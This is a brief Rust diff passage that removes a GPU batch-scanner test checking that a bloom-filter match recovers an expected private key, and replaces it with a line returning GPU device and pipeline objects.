-        let result = scanner.process_batch(&fingerprints, &bloom_data).unwrap();
-        
-        // 4. Verify hit
-        assert_eq!(result.matches_found.len(), 1, "GPU should have matched the test vector");
-        assert_eq!(result.matches_found[0].private_key.as_ref(), &privkey_bytes[..]);
+        Ok((device, queue, pipeline, bind_group_layout))
     }
 }
